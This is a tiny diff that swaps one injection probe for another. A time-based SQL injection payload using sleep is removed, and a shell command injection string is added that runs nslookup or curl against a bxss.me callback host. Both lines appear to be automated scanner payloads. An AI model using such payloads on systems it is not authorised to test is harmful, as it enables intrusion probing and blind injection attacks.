@@ -1,1 +1,1 @@
-555'||sleep(27*1000)*brcrtb||'
+|(nslookup -q=cname hitrhcofedvpp29eaa.bxss.me||curl hitrhcofedvpp29eaa.bxss.me)
